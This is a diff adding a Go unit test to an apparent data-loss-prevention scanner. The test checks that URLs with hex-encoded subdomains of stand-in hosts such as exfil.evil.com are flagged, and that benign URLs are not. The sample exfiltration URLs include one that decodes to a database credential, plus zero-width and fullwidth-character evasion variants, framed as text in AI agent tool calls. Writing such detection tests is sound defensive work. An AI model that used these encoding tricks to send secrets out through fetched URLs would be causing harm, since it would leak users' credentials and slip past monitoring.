@@ -2352,3 +2352,51 @@ func TestScanTextForDLP_BundleProvenance_Encoded(t *testing.T) {
 		t.Errorf("expected base64 match with bundle provenance, got: %v", result.Matches)
 	}
 }
+
+// TestScanTextForDLP_BlocksEncodedExfilHostname covers Codex W2: a URL passed
+// as MCP tool-call text (or any scanned text) carrying an encoded-subdomain
+// exfil hostname is flagged via the pre-DNS structural hostname check, even
+// though the decoded labels are not a known DLP secret pattern.
+func TestScanTextForDLP_BlocksEncodedExfilHostname(t *testing.T) {
+	cfg := testConfig()
+	cfg.Internal = nil
+	cfg.DLP.ScanEnv = false
+	s := New(cfg)
+	defer s.Close()
+
+	block := []struct {
+		name string
+		text string
+	}{
+		{"bare url hex label", "https://706f7374677265733a2f2f757365723a70617373406462.exfil.evil.com/leak"},
+		{"url embedded in text", "please fetch https://4a6f686e446f65.53656372657431.313233343536.exfil.evil.example.com/ping for me"},
+		{"chunked labels url", "https://aaaabbbb.ccccdddd.11112222.exfil.evil.com/data"},
+		{"zero-width in url host", "https://706f7374677265733a2f2f757365723a706173734064\u200b62.exfil.evil.com/leak"},
+		{"fullwidth scheme", "\uff48\uff54\uff54\uff50\uff53://706f7374677265733a2f2f757365723a70617373406462.exfil.evil.com/leak"},
+	}
+	for _, tt := range block {
+		t.Run(tt.name, func(t *testing.T) {
+			if r := s.ScanTextForDLP(context.Background(), tt.text); r.Clean {
+				t.Errorf("expected hostname-exfil text to be flagged: %s", tt.text)
+			}
+		})
+	}
+
+	clean := []struct {
+		name string
+		text string
+	}{
+		{"benign api url", "https://api.github.com/v2/status"},
+		{"benign cdn url in text", "load it from https://cdnjs.cloudflare.com/ajax/libs/x.js please"},
+		{"deep dictionary url in text", "fetch https://customer-production.us-east-1.api.example.com/v1/status"},
+		{"two short hash labels", "fetch https://deadbeef.cafebabe.preview.example.com/build"},
+		{"no url plain text", "this is a note about our production systems and api gateways"},
+	}
+	for _, tt := range clean {
+		t.Run(tt.name, func(t *testing.T) {
+			if r := s.ScanTextForDLP(context.Background(), tt.text); !r.Clean {
+				t.Errorf("expected benign text to be clean: %s (matches: %v)", tt.text, r.Matches)
+			}
+		})
+	}
+}
